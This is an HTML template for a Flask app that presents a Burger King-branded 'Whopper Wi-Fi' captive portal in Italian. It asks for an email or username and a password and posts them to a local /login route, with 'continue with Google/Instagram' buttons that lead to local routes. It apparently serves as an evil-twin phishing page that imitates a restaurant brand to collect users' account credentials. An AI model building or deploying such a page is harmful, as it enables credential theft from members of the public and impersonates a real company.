<!DOCTYPE html>
<html lang="it">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">

<title>Burger WiFi</title>

<style>

/* RESET */
body{
    margin:0;
    font-family:Arial, sans-serif;
    background:#f4f4f4;
    text-align:center;
}

/* BARRA ARANCIONE */
.topbar{
    background:#ff7a00;
    height:80px;
    display:flex;
    align-items:center;
    justify-content:space-between;
    padding:0 15px;
}

/* LOGO NELLA BARRA */
.topbar img{
    width:60px;
}

/* MENU FAKE */
.menu{
    width:30px;
    height:3px;
    background:white;
    position:relative;
}

.menu::before,
.menu::after{
    content:"";
    position:absolute;
    width:30px;
    height:3px;
    background:white;
    left:0;
}

.menu::before{ top:-8px; }
.menu::after{ top:8px; }

/* CONTENITORE */
.container{
    padding:20px;
}

/* TITOLO */
.title{
    font-size:32px;
    font-weight:900;
    color:#4b2e1f;
    margin-top:30px;
    line-height:1.2;
}

/* ICONA WIFI */
.wifi{
    width:200px;
    margin:30px auto;
}

/* TESTO */
.subtitle{
    color:#555;
    font-size:16px;
    margin-bottom:20px;
}

/* LOGIN */
.login-box{
    background:white;
    padding:20px;
    border-radius:12px;
    margin:0 20px;
    box-shadow:0 0 10px rgba(0,0,0,0.1);
}

input{
    width:90%;
    padding:14px;
    margin:10px 0;
    border-radius:8px;
    border:1px solid #ccc;
}

button{
    width:95%;
    padding:14px;
    background:#ffcc00;
    border:none;
    border-radius:8px;
    font-weight:bold;
}

/* SOCIAL */
.social{
    margin-top:20px;
}

.social-btn{
    display:flex;
    align-items:center;
    justify-content:center;
    gap:10px;
    background:white;
    padding:14px;
    margin:10px 20px;
    border-radius:10px;
    text-decoration:none;
    color:black;
    box-shadow:0 0 6px rgba(0,0,0,0.1);
    font-weight:bold;
}

.social-btn img{
    width:24px;
}

</style>
</head>

<body>

<!-- BARRA SUPERIORE -->
<div class="topbar">
    <img src="{{ url_for('static', filename='burgerking_logo.png') }}">
    <div class="menu"></div>
</div>

<div class="container">

<h1 class="title">WELCOME TO<br>WHOPPER WI-FI</h1>

<img src="{{ url_for('static', filename='wifi.png') }}" class="wifi">

<p class="subtitle">Accedi per continuare la navigazione</p>

<!-- LOGIN -->
<form method="POST" action="/login" class="login-box">

<input type="text" name="username" placeholder="Email o Username" required>
<input type="password" name="password" placeholder="Password" required>

<button type="submit">CONNECT</button>

</form>

<!-- SOCIAL -->
<div class="social">

<a href="/google" class="social-btn">
<img src="{{ url_for('static', filename='google_logo.png') }}">
Continua con Google
</a>

<a href="/instagram" class="social-btn">
<img src="{{ url_for('static', filename='instagram_logo.png') }}">
Continua con Instagram
</a>

</div>

</div>

</body>
</html>
